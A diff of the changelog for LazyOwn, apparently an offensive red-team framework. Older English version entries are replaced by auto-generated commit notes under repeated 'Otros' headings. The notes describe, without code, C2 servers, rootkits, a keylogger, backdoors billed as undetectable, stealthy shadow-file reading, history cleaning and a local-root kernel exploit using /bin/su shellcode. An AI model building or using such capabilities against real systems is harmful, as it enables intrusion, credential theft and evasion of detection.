 
-## [0.2.30]
+### Otros
 
-### Added
+  *   * more modularization of lazyown.py file
 
-- new ideas
-- some new ideas
 
-### Changed
+### Otros
 
-- some things
+### Otros
 
-### Fixed
+  *   * more modularization of lazyc2.py file
 
-- bug on readme
 
-## [0.2.29]
+### Otros
 
-### Added
+### Otros
 
-- new version, new bots, new c2, new ai
+  *   * more modularization of lazyc2.py file
 
-### Changed
 
-- LazyOwn RedTeam Framework: Command & Control, Reimagined. Now with Telegram & Discord C2 Bots
+### Otros
 
-## [0.2.28]
+### Otros
 
-### Added
+  *   * more modularization of lazyc2.py file
 
-- new fetures
 
-### Changed
+### Otros
 
-- Merge pull request #82 from grisuno/grisuno-patch-3
-- Create FUNDING.yml
-- telegram bot
+### Otros
 
-### Fixed
+  *   * decostruction of the monolitic
 
-- hotfix
 
-## [0.2.27]
+### Otros
 
-### Fixed
+### Otros
 
-- hotfix
+  *   * some improvements in linting
 
-## [0.2.26]
 
-### Added
+### Otros
 
-- new C2 world class powered by AI
-- new C2 con todas las características
+### Otros
 
-### Changed
+  *   * We changed graphify for ReadMenator
 
-- Merge pull request #79 from grisuno/dev7
 
-## [0.2.25]
+### Otros
 
-### Added
+### Otros
 
-- new commands documented at COMMANDS.md, new rootkit named LazyHyde, new malware, nad much much more
-- new ring 3 rootkit, 3 new listeners go python and c, infect pid with shellcode, new style of c2, download_c2 and upload_c2 and much much more
+  *   * Security Advisory from code scan in soupsieve
 
-### Changed
 
-- Merge pull request #77 from grisuno/dev6
+### Otros
 
-## [0.2.24]
+### Otros
 
-### Changed
+  *   * Security Advisory from code scan
 
-- Merge pull request #75 from grisuno/dev5
-- some utils 9 jajaja?
 
-### Fixed
+### Otros
 
-- hotfix(hot fix): path
+### Otros
 
-## [0.2.23]
+  *   * Security Advisory from code scan
 
-### Added
 
-- new release
+### Otros
 
-### Changed
+### Otros
 
-- Merge pull request #73 from grisuno/dev4
-- some utils 8 jajaja?
+  *   * Contrib
 
-## [0.2.22]
 
-### Added
+### Otros
 
-- new commands documented at commands.md
+### Otros
 
-### Changed
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
 
-- Merge pull request #71 from grisuno/dev2
-- some utils 7 jajaja?
 
-## [0.2.21]
+### Otros
 
-### Added
+### Otros
 
-- new commands
+  *   * Merge pull request #177 from grisuno/grisuno-patch-2
 
-### Changed
 
-- Merge pull request #69 from grisuno/dev
-- some utils 6 jajaja?
+### Otros
 
-## [0.2.20]
+### Otros
 
-### Added
+  *   * Update CONTRIBUTING.md
 
-- new feats
 
-### Changed
+### Pruebas
 
-- Merge pull request #67 from grisuno/dev
-- some utils 5 jajaja?
+### Otros
 
-## [0.2.19]
+  *   * test(testing): test
 
-### Added
 
-- new feats documented at COMMANDS.md
+### Otros
 
-### Changed
+### Otros
 
-- Merge pull request #66 from grisuno/dev
-- some utils 4 jajaja?
+  *   * test: test
 
-## [0.2.18]
 
-### Added
+### Otros
 
-- new commands documented at COMMANDS.md
+### Otros
 
-### Changed
+  *   * orquestator of playbooks
 
-- Merge pull request #64 from grisuno/dev
-- some utils 3 jajaja
 
-## [0.2.17]
+### Otros
 
-### Added
+### Otros
 
-- add option 20 of lazymsfvenom module
+  *   * test: test
 
-## [0.2.16]
 
-### Added
+### Otros
 
-- new features
+### Otros
 
-### Changed
+  *   * database, module manager, some payload generation, resource scripting, and love
 
-- Merge pull request #62 from grisuno/dev
-- some utils 2
-- Merge pull request #61 from grisuno/dev
-- some utils
 
-## [0.2.15]
+### Nuevas características
 
-### Added
+### Otros
 
-- mani commands new
-- Merge pull request #59 from grisuno/feature/Certified
+  *   * feat(feat): multinenant, extended params, cloud native attacks, junescape and much much love more \n\n Version: release/0.2.156 \n\n lazyown redteam red love \n\n Modified file(s):\n- .c2_credentials.txt - .github/workflows/agent-contract.yml - .github/workflows/attack_surface_scan.yml - .github/workflows/ci.yml - .github/workflows/codacy.yml - .github/workflows/docker-build.yml - .github/workflows/lint.yml - .github/workflows/pre-commit.yml - .github/workflows/publish-pypi.yml - .github/workflows/security.yml - .github/workflows/test.yml - .github/workflows/test_strict.yml - .gitignore - .secrets.baseline - Dockerfile - KNOWLEDGE_BASE.md - MANIFEST.in - cli/headless.py - docker-compose.yml - lazyaddons/Januscape.yaml - lazyaddons/cloudsploit.yaml - lazyaddons/grype.yaml - lazyaddons/prowler.yaml - lazyaddons/report_full.yaml - lazyaddons/scoutsuite.yaml - lazyaddons/trivy.yaml - lazyown.py - lazyscripts/attack_surface.ls - lazyscripts/cloud_enum.ls - lazyscripts/supply_chain.ls - modules/pipeline_engine.py - params/README.md - params/extended.yaml - payload.json - pipelines/attack_surface.yaml - pipelines/cloud_assessment.yaml - pipelines/supply_chain.yaml - profiles/attack_surface.yaml - profiles/cloud_scan.yaml - profiles/example.yaml - profiles/supply_chain_scan.yaml - pyproject.toml - scripts/validate_agent_contract.sh - tests/test_attack_surface_addons.py - users.json - utils.py\nCreated file(s):\n- .c2_credentials.txt - .github/workflows/agent-contract.yml - .github/workflows/attack_surface_scan.yml - .github/workflows/ci.yml - .github/workflows/docker-build.yml - .github/workflows/lint.yml - .github/workflows/pre-commit.yml - .github/workflows/publish-pypi.yml - .github/workflows/security.yml - .github/workflows/test.yml - .github/workflows/test_strict.yml - .secrets.baseline - Dockerfile - MANIFEST.in - cli/headless.py - docker-compose.yml - lazyaddons/cloudsploit.yaml - lazyaddons/grype.yaml - lazyaddons/prowler.yaml - lazyaddons/report_full.yaml - lazyaddons/scoutsuite.yaml - lazyaddons/trivy.yaml - lazyscripts/attack_surface.ls - lazyscripts/cloud_enum.ls - lazyscripts/supply_chain.ls - params/README.md - params/extended.yaml - pipelines/attack_surface.yaml - pipelines/cloud_assessment.yaml - pipelines/supply_chain.yaml - profiles/attack_surface.yaml - profiles/cloud_scan.yaml - profiles/example.yaml - profiles/supply_chain_scan.yaml - scripts/validate_agent_contract.sh - tests/test_attack_surface_addons.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 12 jul 2026 01:17:06 -04 \n\n Hora: 1783833426
 
-### Changed
 
-- too many commands documented at COMMANDS.md
+### Otros
 
-## [0.2.14]
+### Otros
 
-### Added
+  *   * cloud boost with grype prowler trivy scoutsuite cloudsploit stratus, a brand new params extender yaml awesome, pipelines, profiles, some bugfixing, and much much more
 
-- new tag
-- Merge pull request #57 from grisuno/feature/Hackback
 
-### Changed
+### Otros
 
-- too many commands documented at COMMANDS.md
+### Otros
 
-## [0.2.13]
+  *   * Doc(creation documentation) a brand new KNOWLEDGE_BASE.md
 
-### Added
 
-- feat():
-- Merge pull request #54 from grisuno/feature/jira-3
-- Merge pull request #53 from grisuno/feature/jira-2
-- feat History enabled, multiline commands and startup script
-- Merge pull request #51 from grisuno/feature/1
+### Otros
 
-### Changed
+### Otros
 
-- too many commands documented at COMMANDS.md
-- second
-- first
+  *   * headless :D
 
-### Fixed
 
-- hotfix
+### Otros
 
-## [0.1.66]
+### Otros
 
-### Changed
+  *   * feature(feat): Multitentant, MFA, TOTP Generator, Multiusers, Colab and much much more. \n\n Version: release/0.2.155 \n\n with love \n\n Modified file(s):\n- KNOWLEDGE_BASE.md - README.md - cli/engagement_hooks.py - config.json - deploy/docker-compose.logging.yml - deploy/fluent-bit.conf - deploy/k8s/lazyown-c2.yaml - docs/openapi.yaml - lazyc2.py - lazyown.py - modules/collab_bp.py - modules/compliance.py - modules/lazy_rbac.py - modules/report_generator.py - modules/sessions/llm_budget.json - payloads/default_engagement.json - requirements.txt - templates/admin_tenants.html - templates/admin_users.html - templates/compliance.html - templates/mfa_setup.html - templates/mfa_verify.html - templates/profile.html - tests/test_core_modules.py - users.json\nCreated file(s):\n- KNOWLEDGE_BASE.md - config.json - deploy/docker-compose.logging.yml - deploy/fluent-bit.conf - deploy/k8s/lazyown-c2.yaml - docs/openapi.yaml - modules/compliance.py - modules/lazy_rbac.py - payloads/default_engagement.json - templates/admin_tenants.html - templates/admin_users.html - templates/compliance.html - templates/mfa_setup.html - templates/mfa_verify.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 11 jul 2026 18:49:54 -04 \n\n Hora: 1783810194
 
-- test
-- openredirex, feroxbuster, gowitness, odat
 
-## [0.1.65]
+### Otros
 
-### Changed
+### Otros
 
-- test
-- monteverde machine
+  *   * Multitentant, MFA, TOTP Generator, Multiusers, Colab and much much more.
 
-## [0.1.64]
 
-### Added
+### Otros
 
-- new commands documented at COMMANDS.md
+### Otros
 
-### Changed
+  *   * Doc(creation documentation) a brand new KNOWLEDGE_BASE.md
 
-- test
 
-## [0.1.63]
+### Otros
 
-### Added
+### Otros
 
-- new commands documented at COMMANDS.md
+  *   * Update README.md
 
-### Changed
 
-- test
-- no test
-- test
-- deply
-- deploy
-- hashs
+### Otros
 
-## [0.1.62]
+### Otros
 
-### Added
+  *   * Doc(creation documentation) a brand new KNOWLEDGE_BASE.md
 
-- new commands like emp3r0r, template_helper_serializer, gospherus, wpscan, createjsonmachine_batch this is so important, is for monetize your skills with hackerone.com
 
-## [0.1.61]
+### Correcciones
 
-### Added
+### Otros
 
-- New Feature Automate Arduino Attacks or AAA the command is lazy_ducky_digispark
+  *   * fix(fix): docker \n\n Version: release/0.2.154 \n\n some love in docker files \n\n Modified file(s):\n- .gitignore - CHANGELOG.md - CHEATSHEET.md - CLAUDE.md - README.md - cli/command_index.json - cli/commands/ai.py - cli/commands/recon.py - core/config.py - core/llm_budget.py - core/payload_schema.py - core/safe_subprocess.py - docs/SECURITY_CONTRACTS.md - external/install_external.sh - lazyaddons/BlackObsidianC2.yaml - lazyaddons/FreeDom.yaml - lazyaddons/Januscape.yaml - lazyaddons/LazyOwnOpenCodeAdapter.yaml - lazyaddons/beacon.yaml - lazyaddons/clean_local_history.yaml - lazyaddons/curlfree.yaml - lazyaddons/estorides.yaml - lazyaddons/keylogger.yaml - lazyaddons/packet_edit_meme.yaml - lazyaddons/pytbackdoorch.yaml - lazyaddons/shad0w.yaml - lazyaddons/vulns-2026-fatfs-chance.yaml - lazyc2.py - lazyc2/README.md - lazyc2/security/command_allowlist.py - lazyc2/security/cors.py - lazyc2/security/csrf.py - lazyc2/security/html_sanitizer.py - lazyc2/security/https_redirect.py - lazyc2/security/trusted_proxy.py - lazyown-docker/Dockerfile - lazyown-docker/README.md - lazyown-docker/docker-compose.yml - lazyown-docker/hostdiscover.sh - lazyown-docker/mkdocker.sh - lazyown.py - modules/hostdiscover.sh - modules/lazybotnet.py - modules/lazyhoneypot.py - modules/lazyownserver.py - modules/llm_factory.py - modules/rootkit/mrhyde3.c - modules/scripts/clean_history.sh.sh - modules/sessions/llm_budget.json - modules/wordlist/prompt.txt - payload.json - pwntomate.py - requirements-ml.txt - requirements.txt - skills/claude_md_orchestrator/README.md - skills/claude_md_orchestrator/SKILL.md - skills/claude_md_orchestrator/SPECS.md - skills/claude_md_orchestrator/__init__.py - skills/claude_md_orchestrator/bdd_agent.py - skills/claude_md_orchestrator/boy_scout.py - skills/claude_md_orchestrator/cicd_agent.py - skills/claude_md_orchestrator/config.py - skills/claude_md_orchestrator/contracts/ci_strict_mode.md - skills/claude_md_orchestrator/contracts/llm_budget_cap.md - skills/claude_md_orchestrator/documentation_agent.py - skills/claude_md_orchestrator/models.py - skills/claude_md_orchestrator/orchestrator.py - skills/claude_md_orchestrator/parser.py - skills/claude_md_orchestrator/reviewer_agent.py - skills/claude_md_orchestrator/sdd_agent.py - skills/claude_md_orchestrator/tdd_agent.py - skills/claude_md_orchestrator/tests/conftest.py - skills/claude_md_orchestrator/tests/test_orchestrator.py - skills/claude_md_orchestrator/validators.py - skills/lazyown.md - skills/lazyown_mcp.py - tests/test_aes_key_propagation.py - tests/test_ci_strict.py - tests/test_command_allowlist.py - tests/test_command_allowlist_behavior.py - tests/test_command_palette.py - tests/test_cors_behavior.py - tests/test_cors_policy.py - tests/test_cors_socketio_regression.py - tests/test_csrf_behavior.py - tests/test_csrf_policy.py - tests/test_html_sanitizer.py - tests/test_https_redirect.py - tests/test_llm_budget.py - tests/test_safe_subprocess.py - tests/test_safe_subprocess_behavior.py - tests/test_trusted_proxy.py - utils.py\nCreated file(s):\n- core/llm_budget.py - core/safe_subprocess.py - docs/SECURITY_CONTRACTS.md - lazyaddons/BlackObsidianC2.yaml - lazyaddons/FreeDom.yaml - lazyaddons/Januscape.yaml - lazyaddons/LazyOwnOpenCodeAdapter.yaml - lazyaddons/clean_local_history.yaml - lazyaddons/curlfree.yaml - lazyaddons/estorides.yaml - lazyaddons/keylogger.yaml - lazyaddons/packet_edit_meme.yaml - lazyaddons/pytbackdoorch.yaml - lazyaddons/shad0w.yaml - lazyaddons/vulns-2026-fatfs-chance.yaml - lazyc2/security/command_allowlist.py - lazyc2/security/cors.py - lazyc2/security/csrf.py - lazyc2/security/html_sanitizer.py - lazyc2/security/https_redirect.py - lazyc2/security/trusted_proxy.py - lazyown-docker/hostdiscover.sh - modules/rootkit/mrhyde3.c - modules/scripts/clean_history.sh.sh - modules/sessions/llm_budget.json - skills/claude_md_orchestrator/README.md - skills/claude_md_orchestrator/SKILL.md - skills/claude_md_orchestrator/SPECS.md - skills/claude_md_orchestrator/__init__.py - skills/claude_md_orchestrator/bdd_agent.py - skills/claude_md_orchestrator/boy_scout.py - skills/claude_md_orchestrator/cicd_agent.py - skills/claude_md_orchestrator/config.py - skills/claude_md_orchestrator/contracts/ci_strict_mode.md - skills/claude_md_orchestrator/contracts/llm_budget_cap.md - skills/claude_md_orchestrator/documentation_agent.py - skills/claude_md_orchestrator/models.py - skills/claude_md_orchestrator/orchestrator.py - skills/claude_md_orchestrator/parser.py - skills/claude_md_orchestrator/reviewer_agent.py - skills/claude_md_orchestrator/sdd_agent.py - skills/claude_md_orchestrator/tdd_agent.py - skills/claude_md_orchestrator/tests/conftest.py - skills/claude_md_orchestrator/tests/test_orchestrator.py - skills/claude_md_orchestrator/validators.py - tests/test_aes_key_propagation.py - tests/test_ci_strict.py - tests/test_command_allowlist.py - tests/test_command_allowlist_behavior.py - tests/test_cors_behavior.py - tests/test_cors_policy.py - tests/test_cors_socketio_regression.py - tests/test_csrf_behavior.py - tests/test_csrf_policy.py - tests/test_html_sanitizer.py - tests/test_https_redirect.py - tests/test_llm_budget.py - tests/test_safe_subprocess.py - tests/test_safe_subprocess_behavior.py - tests/test_trusted_proxy.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: jue 09 jul 2026 15:34:38 -04 \n\n Hora: 1783625678
 
-### Changed
 
-- refactor of users.txt
-- refactor lazy_ruberdigispark isnto duckyspark
-- trasnlated nmap script
-- nmap
-- Update README.md
+### Otros
 
-## [0.1.60]
+### Otros
 
-### Changed
+  *   * hotfix in dockerfile, docker compose, docker sccript to build image, and more love :D
 
-- finger_user_enum
 
-## [0.1.59]
+### Otros
 
-### Changed
+### Otros
 
-- trasnform
+  *   * shadow read the shadow file without trace
 
-## [0.1.58]
 
-### Fixed
+### Otros
 
-- bug fixing
+### Otros
 
-## [0.1.57]
+  *   * vulns-2026-fatfs-chance
 
-### Changed
 
-- tags
+### Otros
 
-## [0.1.56]
+### Otros
 
-### Added
+  *   * windows sdk headers
 
-- feature(feature & refactor): new commands and refactor
 
-### Changed
+### Otros
 
-- refactor de find y nc
+### Otros
 
-## [0.1.55]
+  *   * Update README.md
 
-### Changed
 
-- automsf
+### Otros
 
-## [0.1.54]
+### Otros
 
-### Added
+  *   * Update README.md
 
-- test(new machine return): is a nice machine :P
-- new machine yummy.htb found a command in find to reverse shell :P
-- new attack mfscosole automated
 
-## [0.1.53]
+### Otros
 
-### Changed
+### Otros
 
-- testing DEPLOY.sh script
-- nueva documentacion comando evidence
-- lazyown infinite glitch storage
+  *   * junuscape :O
 
-### Fixed
 
-- fix in find command
+### Otros
 
-## [0.1.52]
+### Otros
 
-### Changed
+  *   * Merge pull request #163 from grisuno/dependabot/pip/python-engineio-4.13.2
 
-- refactor de credentials de evilwinrm de psexec, find
-- eternalblue
 
-## [0.1.51]
+### Otros
 
-### Added
+### Otros
 
-- new commands and functionalities
+  *   * chore(deps): bump python-engineio from 4.13.1 to 4.13.2
 
-### Changed
 
-- deleting users from ctf game from repo
+### Otros
 
-## [0.1.50]
+### Otros
 
-### Added
+  *   * Merge pull request #162 from grisuno/dependabot/pip/python-socketio-5.16.2
 
-- new command Shadowsocks
 
-## [0.1.49]
+### Otros
 
-### Changed
+### Otros
 
-- now we are vip
+  *   * chore(deps): bump python-socketio from 5.16.1 to 5.16.2
 
-## [0.1.48]
 
-### Added
+### Otros
 
-- new commands documented at COMMANDS.md
+### Otros
 
-## [0.1.47]
+  *   * updating lazyown.py do_form duplicated
 
-### Added
 
-- some test and new resources and externals scripst to download :D
-- new cool stuff xD
+### Otros
 
-## [0.1.46]
+### Otros
 
-### Added
+  *   * clean history command: clean_local_history
 
-- feat(win backdoor): undetectable
 
-## [0.1.45]
+### Otros
 
-### Changed
+### Otros
 
-- c2 insecure filename
+  *   * thanks you very much to EQSTLab to provide the advisory :D thanks you bro changelog updated
 
-## [0.1.44]
 
-### Added
+### Otros
 
-- feature(new commands): documented at COMMANDS.md
+### Otros
 
-### Changed
+  *   * some warnings urlib deleted :D
 
-- documented resources, and externals, and one command dr0p1t
 
-## [0.1.43]
+### Otros
 
-### Added
+### Otros
 
-- new commands: scarecrow, createmail, eyewitness, secretsdump, getuserspns, passwordspray
+  *   * some security advisory patched thanks you very much to EQSTLab to provide the advisory :D thanks you bro
 
-## [0.1.42]
 
-### Changed
+### Otros
 
-- install
-- graph
+### Otros
 
-## [0.1.41]
+  *   * lazyaddons PACKET_EDIT_MEME - aka CVE-2026-46331 net/sched act_pedit partial-COW page-cache corruption (culprit 899ee91156e5, present v5.18 .. fixed v7.1-rc7). packet_edit_meme.c turns it into unprivileged local root: a userns CAP_NET_ADMIN child overwrites the cached ELF entry of setuid-root /bin/su with setgid(0)+setuid(0)+execve(/bin/sh) shellcode.
 
-### Added
 
-- 2 new commands
+### Otros
 
-## [0.1.40]
+### Otros
 
-### Changed
+  *   * some love now we support curlfree command :D
 
-- install testing
-- install wa broken
 
-## [0.1.39]
+### Otros
 
-### Changed
+### Otros
 
-- emire
-- veil
-- now tord, trace, and generatedic to generate dictionary with params
+  *   * some love now we support mcp to opencode
 
-## [0.1.38]
 
-### Added
+### Otros
 
-- testing new feature tord
-- new alias
-- new links
+### Otros
 
-### Changed
+  *   * some love, aes_key in payload.json and some love to c2
 
-- ivy shellcodes test
-- corrections in text
-- better docs
-- msfpc
 
-## [0.1.37]
+### Otros
 
-### Changed
+### Otros
 
-- comandos nuevos documentados en commands.md
+  *   * some love Black Obsidian is a next-generation C2 (Command & Control) server designed for professional Red Team operations. Built with Go and PocketBase, it offers a modern and specialized alternative to complex C2 servers while maintaining agility, security, and customization ease.
 
-## [0.1.36]
 
-### Added
+### Otros
 
-- new command apache_users & new options -p to use diferents payloads.json
+### Otros
 
-## [0.1.35]
+  *   * hotfixing
 
-### Changed
 
-- documented malwarebazar
-- documentating
-- Nuevos comandos documentados en COMMANDS.md
+### Otros
 
-## [0.1.34]
+### Otros
 
-### Changed
+  *   * hotfixing
 
-- nuevos comandos documetados en COMMANDS.md
 
-## [0.1.33]
+### Otros
 
-### Changed
+### Otros
 
-- nuevos comandos documentados en COMMANDS.md
+  *   * bug fixing
 
-## [0.1.32]
 
-### Changed
+### Otros
 
-- deleted the insecure chat
+### Otros
 
-## [0.1.31]
+  *   * new skills, test, and new pytorch backdoor :D
 
-### Changed
 
-- Nuevos comandos documentados en COMMANDS.md
+### Otros
 
-## [0.1.29]
+### Otros
 
-### Fixed
+  *   * new rookit io_uring is a poc
 
-- some fixes in c2
 
-## [0.1.28]
+### Otros
 
-### Changed
+### Otros
 
-- to kick from net some ip
+  *   * some tests of integration FreeDom in lazyown
 
-## [0.1.27]
 
-### Added
+### Otros
 
-- feature(new command c2 documentad at COMMANDS.md): a little botnet over http :)
+### Otros
 
-## [0.1.26]
+  *   * a brand new c keylogger :D
 
-### Fixed
 
-- fix(fix auto exploit cacti rce logged): now the attack work automated
+### Otros
 
-## [0.1.25]
+### Otros
 
-### Added
+  *   * update deepseek prompts wink wink
 
-- feature(new commands docummented at COMMANDS.md): waybackmachine, morse, powerserver, shellshock, wifipass, ngrok and smalldic
 
-## [0.1.24]
+### Otros
 
-### Added
+### Otros
 
-- feature(2 new attacks): docummented at COMMANDS.md
+  *   * update prompts wink wink
 
-## [0.1.23]
 
-### Added
+### Otros
 
-- test(new machine): monitorsthree.htb
-- refactor(new payload): in msfvenom
-- feat(new feature): padbuster
+### Otros
 
-## [0.1.22]
+  *   * Estorides comes to LazyOwn RedTeam to Reconnaissance like a nation state level
 
-### Added
 
-- docs(new documentation): better documentation to commands and utils
-- feat(new feat in createdll): new option 3 to run automate create dll blazor malware
+### Otros
 
-### Changed
+### Otros
 
-- nueva versiòn en la web reflejada en el banner
+  *   * Estorides comes to LazyOwn RedTeam to Reconnaissance like a nation state level
 
-## [0.1.21]
 
-### Changed
+### Otros
 
-- blazormalware corrected now functional and armed :)
+### Otros
 
-## [0.1.20]
+  *   * add pompem in ss pipeline
 
-### Added
 
-- Translate README.md to English, enhancing clarity and structure for better understanding of the project features and usage
-- feat(malware new): blazor malware
+### Pruebas
 
-## [0.1.19]
+### Otros
 
-### Changed
+  *   * test(test): test pipe line deply \n\n Version: release/0.2.152 \n\n with love \n\n Modified file(s):\n- CLAUDE.md - COMMANDS.md - ESSENTIALS.md - QUICKSTART.md - cli/command_index.json - cli/splash.py - cli/style.py - cli/themes.py - cli/tui_theme.py - docs/COMMANDS.html - lazyown.py - tests/test_command_palette.py - tests/test_tui_splash.py - tests/test_tui_style.py - tests/test_tui_theme_command.py - tests/test_tui_themes.py\nCreated file(s):\n- cli/splash.py - cli/style.py - cli/tui_theme.py - tests/test_tui_splash.py - tests/test_tui_style.py - tests/test_tui_theme_command.py - tests/test_tui_themes.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mar 16 jun 2026 23:11:29 -04 \n\n Hora: 1781665889
 
-- se agrega la libreria colors en modules para usar colorines en los modulos
-- dos comandos nuevos, skipfish y createdll, nuevo shellcode
 
-## [0.1.18]
+### Otros
 
-### Added
+### Otros
 
-- create new command shellcode, run lazymsfvenom modified to create shellcode.sh
+  *   * Merge branch 'pp' into dev
 
-## [0.1.17]
 
-### Added
+### Otros
 
-- feat(new feat): new funcionality in proxy command, hexdump on screen, capacity to edit responces from client and server :) mitm ? xD now only prints the thata before sent
+### Otros
 
-## [0.1.16]
+  *   * Merge branch 'docs/engage-fastpath' into dev
 
-### Added
 
-- new prompt
+### Otros
 
-## [0.1.15]
+### Otros
 
-### Added
+  *   * Merge branch 'chore/cli-print-hygiene' into dev
 
-- new command set_proxychains
 
-## [0.1.14]
+### Documentación
 
-### Fixed
+### Otros
 
-- fix(bug fixing): bug fixing in vars of DEPLOY.sh
+  *   * docs(onboarding): surface the engage one-command fast-path
 
-## [0.1.13]
 
-### Added
+### Otros
 
-- feature(new payload in msfvenom android): new options in msf rev android
+### Otros
 
-## [0.1.12]
+  *   * chore(cli): print hygiene + remove C2 credential leak in lazyown.py
 
-### Added
 
-- feat(implement sicat libs): to ss command
+### Nuevas características
 
-### Changed
+### Otros
 
-- agradecimientos
+  *   * feat(tui): wire tui_theme command and first-run splash into the shell
 
-## [0.1.11]
 
-### Fixed
+### Nuevas características
 
-- feat(some fixes): html and new patreon :)
+### Otros
 
-## [0.1.10]
+  *   * feat(tui): add animated splash overlay for first-run experience
 
-### Added
 
-- feature(new tools): new commands, new payloads in find, new cves, new machine
+### Nuevas características
 
-## [0.1.9]
+### Otros
 
-### Added
+  *   * feat(tui): add tui_theme command logic with cycle/prev/reset
 
-- feat(new feature): new command finalrecon docuemnted at COMMANDS.md
 
-## [0.1.8]
+### Nuevas características
 
-### Added
+### Otros
 
-- new commando swaks to abuse of smtp
+  *   * feat(tui): add solarized, monokai, gruvbox, high_contrast themes
 
-## [0.1.7]
 
-### Fixed
+### Nuevas características
 
-- fix(fix in vpn): new machine
+### Otros
 
-## [0.1.6]
+  *   * feat(tui): add cli/style semantic token layer over themes
 
-### Added
 
-- feature(sessionssh y sessionsshstrace): nuevos comandos documentados en COMMANDS.md
+### Refactorización
 
-### Changed
+### Otros
 
-- test(deleted files): index.sh y dump_readme.sh
-- refactor(refactor DEPLOY, sessionstrace): se crea todo en un solo archivo deploy y se eliminaran en el proximo commit index.sh ydump_readme.sh
+  *   * refactor(refactor): some love to the code, no features news, but refactor. \n\n Version: release/0.2.151 \n\n with love \n\n Modified file(s):\n- .gitignore - CLAUDE.md - QUICKSTART.md - README.md - UTILS.md - cli/command_index.json - core/README.md - core/__init__.py - core/dependencies.py - docs/UTILS.html - graphify-out/.graphify_analysis_lazyown.json - graphify-out/.graphify_ast_focused.json - graphify-out/.graphify_chunk_02.json - graphify-out/.graphify_chunk_04.json - graphify-out/.graphify_chunk_07.json - graphify-out/.graphify_chunk_09.json - graphify-out/.graphify_chunk_11.json - graphify-out/.graphify_chunk_13.json - graphify-out/.graphify_chunk_14.json - graphify-out/.graphify_chunk_15.json - graphify-out/.graphify_chunk_16.json - graphify-out/.graphify_chunks.json - graphify-out/.graphify_detect_focused.json - graphify-out/.graphify_python - graphify-out/README.md - graphify-out/cache/01702100c0971042314c03d56fff92cb25988d38c432a42fecc61c786bc8ade6.json - graphify-out/cache/031e8f5e7fd55b2c0db4c2eedcc353706daed78f368eed868c8c58262e9bef73.json - graphify-out/cache/032c16c926dfb9ca396b8ad6a0e3a90242faa5255f45ba81633645d1bcad47d2.json - graphify-out/cache/04645e2e40ed867c620396c786c886965ce85dc0fa31f4810fe47fc440faa14f.json - graphify-out/cache/0482e1126bd734dc2d95c16ec57aecde20bd77cffe1bd03b4e268e59c5bbb52c.json - graphify-out/cache/04b81d9eb5fe5e267b8d23620163a1e1eaaa85ab6086fda5f6730f2e6d0df3f1.json - graphify-out/cache/04bad0a88c727f42f0d20fb8568e421bf0a19054604393072252a993708eb0ae.json - graphify-out/cache/05d0058b7b7ffee38accd7302a630910db73a78a1b984a5d4eeb79d50588a6e8.json - graphify-out/cache/0629fca57b461f18881d90550cafae11789e45d50b5a59a1c90cc281bf629edc.json - graphify-out/cache/06b82f281d54d0a539a52866cb272936c1f6a4e90c39272830a035ff543f9f02.json - graphify-out/cache/06dee47a456c807964a4f51d2243056cfd0ea9177d31b261588c1d4487a497b3.json - graphify-out/cache/079eb911fa61d31016bd1d1f937a2da27ff1857802dd1e5afa92c7be73ce98a6.json - graphify-out/cache/07c1bffda5afe6f60f7ccb4e617be7cd543b4eae4141fbd9c045831a99eb6eeb.json - graphify-out/cache/07de6a9f9d0654633dd3a76d3807a1347328e13ef77f4dc7e5a0f89fd1354d30.json - graphify-out/cache/083ce22dd3b6c00d45e3f54a378bfd741d15263d149dc7514d42f28cccb84e20.json - graphify-out/cache/089e43efe29f124b80fc8144fcbad3384c36eb185d7eb38f5b3905c3793de9a3.json - graphify-out/cache/08fefb331b7de4cead158721c8ec6ec430b920afbea4757912fc34657ab9abb6.json - graphify-out/cache/09cd042a93c9bf9ed60a6c8d930b86358f21f334b9e356cd51e87e52ab43d0bb.json - graphify-out/cache/0abad2644a5f511f96d078ff2a01781d69f1abdae30017998a9a42aa95a18147.json - graphify-out/cache/0ad9eaed237f31982abcee07599d1bc0e6b3f45d4e890c8c552bffb2d532e59e.json - graphify-out/cache/0b570f4c17caeb499116c0ae8b2329f55a99a77f48a92ed5a54a8e2facafd26f.json - graphify-out/cache/0c496a3ce7d2bb97010a6cc6e9f0f2ed4bcc57b33db590844a5e8e59a7a1b15f.json - graphify-out/cache/0c9ae1e0169642d6b4d2d1651593143763105b71ac178261421724227c344d1d.json - graphify-out/cache/0d76b6b608eb14bbe5ae7aea9f6c9437c4adecedac1becff937a53c194d9725f.json - graphify-out/cache/0ddbacdb3fd8ee2fc6e47f50d3bf4e7783ad54ffb2e57000788d5965842c8799.json - graphify-out/cache/0de7abbb28d167d385adb5dd6c40d99c6b86158bc6c4b188043c244025b0dabc.json - graphify-out/cache/0ed4a0508d9076d5a3c0efa1714f09ebcaa4cfbe27c7ac4b3d94487c7ea7ee48.json - graphify-out/cache/0f3ff7b3a03d44dd45fa7190c64678587a43e3cd6490f157db914d6fe512e875.json - graphify-out/cache/0fbaab041e40558ee9af714137294f1d754d7b06cd8b4062ba4ec1981ed3b0c4.json - graphify-out/cache/0fc93ed9ef1df2a87c52ce9c48d4f1a6188e031e0701565b82f034447ac3dfa8.json - graphify-out/cache/10329627ec939c8b33e2f5ad77e9899343f6c7e75ccd777fea5b6bf39543c504.json - graphify-out/cache/115b3c9a01e927ccbb7622d251aa15ba6c688f43245671fa5ee557926f5f1b82.json - graphify-out/cache/117e8a6e6898720deb979a8c69db0fe2f631487cd631fd5c9ec5383604d2851f.json - graphify-out/cache/11ec92d92b7022932e78a3c107c931606034d00708715a32347eb82139f6efb6.json - graphify-out/cache/128fb0e4b6c348f78fc80fc6f0e9d122608298e3bca713fa6588f3485c07061d.json - graphify-out/cache/12c9035dd419ffe143299ae803cde3d88d9cca4e6a0485b7e55bb0b18270263e.json - graphify-out/cache/134614094a61557dafc1c2e36f30059831a503b1687fd46d59c59b44c1923b10.json - 